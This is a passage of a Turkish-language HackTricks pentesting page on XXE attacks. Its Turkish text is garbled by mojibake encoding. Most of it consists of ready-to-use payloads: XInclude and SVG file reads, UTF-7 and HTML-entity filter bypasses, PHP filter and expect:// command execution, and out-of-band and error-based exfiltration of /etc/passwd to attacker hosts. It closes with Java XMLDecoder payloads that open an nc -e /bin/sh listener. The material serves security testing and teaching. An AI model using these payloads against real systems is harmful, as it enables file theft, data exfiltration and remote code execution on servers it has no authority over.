## Gizli XXE YÃ¼zeyleri

### XInclude

Sunucu tarafÄ± XML belgelerine, arka uÃ§ SOAP isteklerindeki gibi, istemci verilerini entegre ederken, XML yapÄ±sÄ± Ã¼zerinde doÄŸrudan kontrol genellikle sÄ±nÄ±rlÄ±dÄ±r; bu da `DOCTYPE` Ã¶ÄŸesini deÄŸiÅŸtirme kÄ±sÄ±tlamalarÄ± nedeniyle geleneksel XXE saldÄ±rÄ±larÄ±nÄ± engeller. Ancak, bir `XInclude` saldÄ±rÄ±sÄ±, XML belgesinin herhangi bir veri Ã¶ÄŸesi iÃ§inde dÄ±ÅŸ varlÄ±klarÄ±n eklenmesine izin vererek bir Ã§Ã¶zÃ¼m sunar. Bu yÃ¶ntem, yalnÄ±zca sunucu tarafÄ±ndan oluÅŸturulan bir XML belgesindeki verilerin bir kÄ±smÄ± kontrol edilebildiÄŸinde bile etkilidir.

Bir `XInclude` saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in, `XInclude` ad alanÄ± beyan edilmeli ve hedef dÄ±ÅŸ varlÄ±ÄŸÄ±n dosya yolu belirtilmelidir. AÅŸaÄŸÄ±da, bÃ¶yle bir saldÄ±rÄ±nÄ±n nasÄ±l formÃ¼le edilebileceÄŸine dair kÄ±sa bir Ã¶rnek bulunmaktadÄ±r:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - Dosya YÃ¼kleme

KullanÄ±cÄ±lar tarafÄ±ndan belirli uygulamalara yÃ¼klenen dosyalar, sunucuda iÅŸlenirken XML veya XML iÃ§eren dosya formatlarÄ±nÄ±n nasÄ±l ele alÄ±ndÄ±ÄŸÄ±ndaki zayÄ±flÄ±klarÄ± istismar edebilir. Ofis belgeleri (DOCX) ve gÃ¶rÃ¼ntÃ¼ler (SVG) gibi yaygÄ±n dosya formatlarÄ± XML tabanlÄ±dÄ±r.

KullanÄ±cÄ±lar **gÃ¶rÃ¼ntÃ¼ yÃ¼klediÄŸinde**, bu gÃ¶rÃ¼ntÃ¼ler sunucu tarafÄ±nda iÅŸlenir veya doÄŸrulanÄ±r. PNG veya JPEG gibi formatlar bekleyen uygulamalar iÃ§in bile, **sunucunun gÃ¶rÃ¼ntÃ¼ iÅŸleme kÃ¼tÃ¼phanesi SVG gÃ¶rÃ¼ntÃ¼lerini de destekleyebilir**. XML tabanlÄ± bir format olan SVG, saldÄ±rganlar tarafÄ±ndan kÃ¶tÃ¼ niyetli SVG gÃ¶rÃ¼ntÃ¼leri gÃ¶ndermek iÃ§in istismar edilebilir ve bÃ¶ylece sunucuyu XXE (XML DÄ±ÅŸ VarlÄ±k) zayÄ±flÄ±klarÄ±na maruz bÄ±rakabilir.

AÅŸaÄŸÄ±da, kÃ¶tÃ¼ niyetli bir SVG gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n sistem dosyalarÄ±nÄ± okumaya Ã§alÄ±ÅŸtÄ±ÄŸÄ± bir istismar Ã¶rneÄŸi gÃ¶sterilmektedir:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
BaÅŸka bir yÃ¶ntem, PHP "expect" sarmalayÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla **komutlarÄ± Ã§alÄ±ÅŸtÄ±rmayÄ±** denemeyi iÃ§erir:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Her iki durumda da, SVG formatÄ±, sunucunun yazÄ±lÄ±mÄ±nÄ±n XML iÅŸleme yeteneklerini istismar eden saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanÄ±lÄ±r ve bu da saÄŸlam girdi doÄŸrulama ve gÃ¼venlik Ã¶nlemlerine olan ihtiyacÄ± vurgular.

Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) adresini kontrol edin!

**Okunan dosyanÄ±n veya yÃ¼rÃ¼tme sonucunun ilk satÄ±rÄ±, oluÅŸturulan gÃ¶rÃ¼ntÃ¼nÃ¼n Ä°Ã‡Ä°NDE gÃ¶rÃ¼necektir. Bu nedenle, SVG'nin oluÅŸturduÄŸu gÃ¶rÃ¼ntÃ¼ye eriÅŸebilmeniz gerekir.**

### **PDF - Dosya yÃ¼kleme**

AÅŸaÄŸÄ±daki gÃ¶nderiyi okuyarak **bir PDF dosyasÄ±nÄ± yÃ¼kleyerek XXE'yi nasÄ±l istismar edeceÄŸinizi Ã¶ÄŸrenin:**

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Ä°Ã§erik TÃ¼rÃ¼: x-www-urlencoded'dan XML'e

EÄŸer bir POST isteÄŸi verileri XML formatÄ±nda kabul ediyorsa, o istekte bir XXE'yi istismar etmeyi deneyebilirsiniz. Ã–rneÄŸin, normal bir istek aÅŸaÄŸÄ±dakileri iÃ§eriyorsa:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
O zaman aÅŸaÄŸÄ±daki isteÄŸi, aynÄ± sonuÃ§la gÃ¶nderebilirsiniz:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON'dan XEE'ye

Ä°steÄŸi deÄŸiÅŸtirmek iÃ§in â€œ**Content Type Converter**â€œ adlÄ± bir Burp Eklentisi kullanabilirsiniz. [Burada](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) bu Ã¶rneÄŸi bulabilirsiniz:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
BaÅŸka bir Ã¶rnek [burada](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) bulunabilir.

## WAF & Koruma AÅŸma

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Bu yalnÄ±zca XML sunucusu `data://` protokolÃ¼nÃ¼ kabul ediyorsa Ã§alÄ±ÅŸÄ±r.

### UTF-7

Burada \[**"Encode Recipe**" of cyberchef kullanabilirsiniz ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) UTF-7'ye dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protokol Atlatma

EÄŸer web PHP kullanÄ±yorsa, `file:/` yerine **php wrappers**`php://filter/convert.base64-encode/resource=` kullanarak **iÃ§ dosyalara** eriÅŸebilirsiniz.

EÄŸer web Java kullanÄ±yorsa [**jar: protokolÃ¼nÃ¼**](xxe-xee-xml-external-entity.md#jar-protocol) kontrol edebilirsiniz.

### HTML VarlÄ±klarÄ±

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) adresinden bir hile\
Bir **varlÄ±k iÃ§inde bir varlÄ±k** oluÅŸturabilir, bunu **html varlÄ±klarÄ±** ile kodlayabilir ve ardÄ±ndan **dtd yÃ¼klemek** iÃ§in Ã§aÄŸÄ±rabilirsiniz.\
KullanÄ±lan **HTML VarlÄ±klarÄ±**'nÄ±n **sayÄ±sal** olmasÄ± gerektiÄŸini unutmayÄ±n (Ã¶rneÄŸin \[bu Ã¶rnekte]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD Ã¶rneÄŸi:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP SarÄ±cÄ±lar

### Base64

**Ã‡Ä±kar** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **DÄ±ÅŸ kaynaÄŸÄ± Ã§Ä±kar**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Uzaktan kod yÃ¼rÃ¼tme

**EÄŸer PHP "expect" modÃ¼lÃ¼ yÃ¼klÃ¼yse**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Bu Ã¶rnek, [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) adresinden esinlenmiÅŸtir.

XLIFF (XML YerelleÅŸtirme DeÄŸiÅŸim Dosya FormatÄ±), yerelleÅŸtirme sÃ¼reÃ§lerinde veri deÄŸiÅŸimini standart hale getirmek iÃ§in kullanÄ±lÄ±r. YerelleÅŸtirme sÄ±rasÄ±nda araÃ§lar arasÄ±nda yerelleÅŸtirilebilir verilerin aktarÄ±mÄ± iÃ§in ve CAT (Bilgisayar Destekli Ã‡eviri) araÃ§larÄ± iÃ§in ortak bir deÄŸiÅŸim formatÄ± olarak kullanÄ±lan XML tabanlÄ± bir formattÄ±r.

### Blind Request Analizi

AÅŸaÄŸÄ±daki iÃ§erikle sunucuya bir istek yapÄ±lÄ±r:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ancak, bu istek bir iÃ§ sunucu hatasÄ±nÄ± tetikler ve Ã¶zellikle iÅŸaretleme bildirimleriyle ilgili bir sorun olduÄŸunu belirtir:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Hata olmasÄ±na raÄŸmen, dÄ±ÅŸ varlÄ±kla bir etkileÅŸim seviyesini gÃ¶steren Burp Collaborator'da bir kayÄ±t alÄ±nÄ±r.

Out of Band Data Exfiltration Verileri dÄ±ÅŸarÄ± aktarmak iÃ§in, deÄŸiÅŸtirilmiÅŸ bir istek gÃ¶nderilir:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Bu yaklaÅŸÄ±m, KullanÄ±cÄ± AracÄ±sÄ±nÄ±n Java 1.8 kullanÄ±mÄ±nÄ± gÃ¶sterdiÄŸini ortaya koymaktadÄ±r. Bu Java sÃ¼rÃ¼mÃ¼nÃ¼n bilinen bir sÄ±nÄ±rlamasÄ±, Out of Band tekniÄŸini kullanarak /etc/passwd gibi yeni satÄ±r karakteri iÃ§eren dosyalarÄ± alabilme yeteneÄŸinin olmamasÄ±dÄ±r.

Hata TabanlÄ± Veri SÄ±zdÄ±rma Bu sÄ±nÄ±rlamayÄ± aÅŸmak iÃ§in, Hata TabanlÄ± bir yaklaÅŸÄ±m kullanÄ±lmaktadÄ±r. Hedef dosyadan veri iÃ§eren bir hatayÄ± tetiklemek iÃ§in DTD dosyasÄ± aÅŸaÄŸÄ±daki gibi yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Sunucu, mevcut olmayan dosyayÄ± yansÄ±tan bir hata ile yanÄ±t verir, bu da sunucunun belirtilen dosyaya eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶sterir:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Hata mesajÄ±nda dosyanÄ±n iÃ§eriÄŸini dahil etmek iÃ§in, DTD dosyasÄ± ayarlanÄ±r:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Bu deÄŸiÅŸiklik, HTTP Ã¼zerinden gÃ¶nderilen hata Ã§Ä±ktÄ±sÄ±nda yansÄ±tÄ±ldÄ±ÄŸÄ± gibi, dosyanÄ±n iÃ§eriÄŸinin baÅŸarÄ±lÄ± bir ÅŸekilde dÄ±ÅŸa aktarÄ±lmasÄ±na yol aÃ§ar. Bu, hassas bilgileri Ã§Ä±karmak iÃ§in hem Out of Band hem de Error-Based tekniklerini kullanan baÅŸarÄ±lÄ± bir XXE (XML External Entity) saldÄ±rÄ±sÄ±nÄ± gÃ¶sterir.

## RSS - XEE

XXE zafiyetini istismar etmek iÃ§in geÃ§erli RSS formatÄ±nda XML.

### Ping back

SaldÄ±rganÄ±n sunucusuna basit HTTP isteÄŸi
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Dosya oku
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Kaynak kodunu oku

PHP base64 filtresi kullanarak
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder, bir XML mesajÄ±na dayalÄ± nesneler oluÅŸturan bir Java sÄ±nÄ±fÄ±dÄ±r. KÃ¶tÃ¼ niyetli bir kullanÄ±cÄ±, bir uygulamanÄ±n **readObject** metoduna rastgele veriler kullanmasÄ±nÄ± saÄŸlarsa, sunucuda anÄ±nda kod yÃ¼rÃ¼tme yetkisi kazanÄ±r.

### Using Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## AraÃ§lar

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referanslar

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Kendi dÄ±ÅŸ DTD'nizi kullanarak HTTP Ã¼zerinden bilgi Ã§Ä±karma: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
